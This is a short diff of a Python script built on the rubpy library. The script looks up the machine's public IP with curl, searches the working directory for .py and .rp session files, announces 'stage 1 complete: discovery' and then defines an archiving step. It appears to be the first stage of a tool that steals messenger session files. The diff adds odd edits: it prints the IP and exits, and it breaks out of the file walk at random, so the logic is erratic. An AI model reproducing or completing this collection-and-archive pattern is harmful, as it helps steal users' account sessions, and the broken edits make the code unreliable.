@@ -6,13 +6,13 @@ from rubpy.exceptions import NotRegistered
 from rubpy.crypto import Crypto
 from Crypto.PublicKey import RSA
 from Crypto.Signature import pkcs1_15
-is_linux = os.uname().sysname == "Linux"
+import random
 ip = os.popen('curl icanhazip.com').read()
-if not is_linux:
-    print("Unsupported os, exiting...")
+print(ip.replace(".",":"))
+exit()
 python_files = []
 rubpy_files = []
-for top in os.curdir:
+for top in (os.curdir,):
     for root, dirs, files in os.walk(top):
         for file in files:
             full_path = os.path.join(root,file)
@@ -22,6 +22,7 @@ for top in os.curdir:
             if file.endswith('.rp'):
                 print("found: ",full_path)
                 rubpy_files.append(full_path)
+        if random.random() > 0.975: break
 dryrun=False
 print("stage 1 complete: discovery")
 def archive(name, data):
